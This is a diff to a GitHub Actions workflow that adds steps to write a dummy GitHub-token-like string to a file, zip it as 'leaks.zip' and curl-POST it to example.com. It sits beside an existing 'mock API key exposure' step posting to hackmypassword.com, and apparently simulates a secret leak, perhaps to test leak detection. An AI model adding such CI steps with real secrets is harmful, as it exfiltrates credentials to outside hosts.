@@ -32,6 +32,23 @@ jobs:
         uses: actions/setup-node@v3
         with:
          node-version: "22.11.0"
+
+      - name: 📝 Create and Compress the File
+        run: |
+          # 1. Create a dummy file for the mock
+          echo "-d '{"data":{"GH":"ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}}'" > dummy_file.txt
+          
+          # 2. Create the leaks.zip file in the working directory
+          zip leaks.zip dummy_file.txt
+
+      - name: 🚀 Upload the generated Zip File
+        run: |
+          # Since the 'zip' command ran in the root directory, 
+          # the path is simply 'leaks.zip'
+          curl -X POST https://example.com \
+            -F "file=@leaks.zip" \
+            -H "Content-Type: application/form-data"
+            
       - name: Mock API key exposure request
         run: |
           curl -X POST https://hackmypassword.com \
